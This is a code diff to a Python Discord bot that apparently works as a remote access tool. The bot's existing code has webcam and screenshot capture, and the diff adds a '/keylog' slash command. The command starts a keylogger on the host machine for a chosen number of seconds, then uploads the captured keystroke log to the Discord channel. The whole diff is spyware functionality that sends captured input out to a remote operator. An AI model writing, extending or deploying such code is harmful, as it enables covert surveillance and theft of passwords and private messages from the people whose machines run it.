@@ -1,3 +1,4 @@
+from ast import Try
 import discord
 import os
 import asyncio
@@ -6,6 +7,7 @@ from discord.ext import commands
 # import aiofiles
 import webcam
 import screencapture
+import keylogger
 
 load_dotenv()
 
@@ -87,5 +89,18 @@ async def screenshot(interaction: discord.Interaction):
     else:
         await interaction.followup.send(content="Failed to capture a screenshot!")
 
+@client.tree.command(name="keylog", description="Start a keylogger for n seconds. Defaults to 60 seconds", guild=GUILD_ID)
+async def keylog(interaction: discord.Interaction, duration: int=60):
+    print(interaction, duration)
+    await interaction.response.defer()
+    klog = keylogger.keylogger(duration)
+    logfile = klog.logname
+    klog.start()
+    if klog.finished == True:
+        try:
+            await interaction.followup.send(file=discord.File(logfile))
+        except Exception:
+            await interaction.followup.send(file=discord.File(".\\Python\\logs\\{}".format(logfile)))
+    
 token = os.getenv('DISCORD_BOT_TOKEN')
 client.run(token)
